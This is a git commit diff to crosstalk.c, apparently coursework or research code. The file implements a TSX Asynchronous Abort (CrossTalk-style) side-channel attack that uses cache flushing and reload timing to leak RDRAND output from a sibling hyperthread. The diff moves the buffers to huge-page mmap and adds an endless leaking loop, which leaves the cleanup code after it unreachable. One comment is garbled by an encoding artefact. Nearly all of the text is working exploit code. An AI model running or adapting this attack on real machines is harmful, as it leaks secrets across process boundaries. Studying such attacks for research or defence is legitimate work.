afd9940dd859410d52d0100a82f738d674566638
mihaela <mihamereuta99@gmail.com>
2025-11-26 06:53:16 +0100

    mmap bug

--- week1/crosstalk.c
+++ week1/crosstalk.c
@@ -10,7 +10,7 @@
 #include "asm.h"        
 
 #define NUM_SAMPLES 10000
-#define NUM_ITERATIONS 1000
+#define NUM_ITERATIONS 100
 #define ROUNDS 10
 #define STRIDE 4096    
 #define POSSIBLE_BYTES 256
@@ -18,7 +18,7 @@
 #define RDRAND_OFFSET 32
 
 
-static uint8_t *valid_addr;
+static uint8_t *leak;
 static uint8_t *reloadbuffer;                     
 static uint64_t CACHE_THRESHOLD;
 
@@ -109,7 +109,7 @@ int main(void) {
 
     usleep(1000);
 
-    // so they can run on the twohyperthreads of the attacker’s physical core
+    // so they can run on the twohyperthreads of the attackerâ€™s physical core
     //child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
     pid_t pid = fork();
 
@@ -122,60 +122,70 @@ int main(void) {
         _exit(0);
     }
 
-    valid_addr = malloc(POSSIBLE_BYTES * STRIDE); // Maybe we should use mmap here?
-    reloadbuffer = malloc(POSSIBLE_BYTES * STRIDE); // Maybe we should use mmap here?
+    size_t leak_len = 4096;
+    size_t const mmap_prot = PROT_READ | PROT_WRITE;
+    size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE| MAP_HUGETLB;
+
+    unsigned char result[BYTES_TO_LEAK];
+    leak = mmap(NULL, leak_len, mmap_prot, mmap_flags, -1, 0);
+    if (leak == MAP_FAILED) { perror("mmap leak"); return 1; }
+
+    reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);
+    if (reloadbuffer == MAP_FAILED) { perror("mmap reloadbuffer"); return 1; }
+
+
 
     // ===================================================PARENT=======================================================
 
+    while(1) {
+        for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
+            uint32_t all_hit_bytes[256] = {0};
 
-    for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
-        printf("Leaking byte %d\n", secret_byte);
-        uint32_t all_hit_bytes[256] = {0};
+            for(int iteration = 0; iteration < NUM_ITERATIONS; iteration++) {
+                
+                // Step 1: flush reload buffer
+                for (int i = 0; i < POSSIBLE_BYTES; i++) {
+                    clflush(&reloadbuffer[i * STRIDE]);
+                }
 
-        for(int iteration = 0; iteration < NUM_ITERATIONS; iteration++) {
-            
-            // Step 1: flush reload buffer
-             for (int i = 0; i < POSSIBLE_BYTES; i++) {
-                clflush(&reloadbuffer[i * STRIDE]);
-            }
+                clflush(leak + secret_byte);
+                sfence();
+                clflush(reloadbuffer); // Necessary to cause TAA
 
-            clflush(valid_addr + secret_byte);
-            sfence();
-            clflush(reloadbuffer); // Necessary to cause TAA
+                // Step 3: TAA
+                if (_xbegin() == _XBEGIN_STARTED)
+                {
+                    size_t index = *(leak + secret_byte) * STRIDE; // This should use the data in the LFB transiently.
+                    *(volatile char*)(reloadbuffer + index);
 
-            // Step 3: TAA
-            if (_xbegin() == _XBEGIN_STARTED)
-            {
-                size_t index = *(valid_addr + secret_byte) * STRIDE; // This should use the data in the LFB transiently. (but doesn't seem like it)
-                *(volatile char*)(reloadbuffer + index);
+                    _xend();
+                }
 
-                _xend();
-            }
-
-            // Step 4: Reload and measure access times
-            for(int j=0; j<POSSIBLE_BYTES; j++){
-                uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
-                if(reload_time < CACHE_THRESHOLD){
-                    all_hit_bytes[j]++;
+                // Step 4: Reload and measure access times
+                for(int j=0; j<POSSIBLE_BYTES; j++){
+                    uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
+                    if(reload_time < CACHE_THRESHOLD){
+                        all_hit_bytes[j]++;
+                    }
                 }
             }
-        }
 
-        // Analyze results to find the most likely byte value
-        int max_index = 0;
-        for(int i = 1; i < 256; i++) {
-            if(all_hit_bytes[i] > all_hit_bytes[max_index]) {
-                max_index = i;
+            // Analyze results to find the most likely byte value
+            int max_index = 0;
+            for(int i = 1; i < 256; i++) {
+                if(all_hit_bytes[i] > all_hit_bytes[max_index]) {
+                    max_index = i;
+                }
             }
+
+            result[secret_byte - RDRAND_OFFSET] = max_index;
         }
 
-        printf("Leaked byte %d: 0x%02x\n", secret_byte, max_index);
+        printf("0x%02x%02x%02x%02x%02x%02x%02x%02x\n", result[0], result[1], result[2], result[3], result[4], result[5], result[6], result[7]);
     }
-   
 
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
     puts("crosstalk done");
     return 0;
 }
-
